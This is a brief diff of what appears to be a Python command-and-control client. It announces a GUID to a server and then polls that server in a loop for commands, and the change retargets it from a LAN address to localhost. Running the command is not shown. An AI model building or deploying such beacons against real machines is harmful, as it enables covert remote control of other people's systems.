@@ -25,10 +25,10 @@ headers = {
 }
 
 # Send our HELLO/GUID
-requests.get(f'http://192.168.1.19:8080/', headers=headers)
+requests.get(f'http://127.0.0.1:5000/', headers=headers)
 
 while 1:
-    a = requests.get(f'http://192.168.1.19/{GUID}.html', headers=headers)
+    a = requests.get(f'http://127.0.0.1:5000/{GUID}.html', headers=headers)
     cmd = a.text
     print('got command')
     print(cmd)
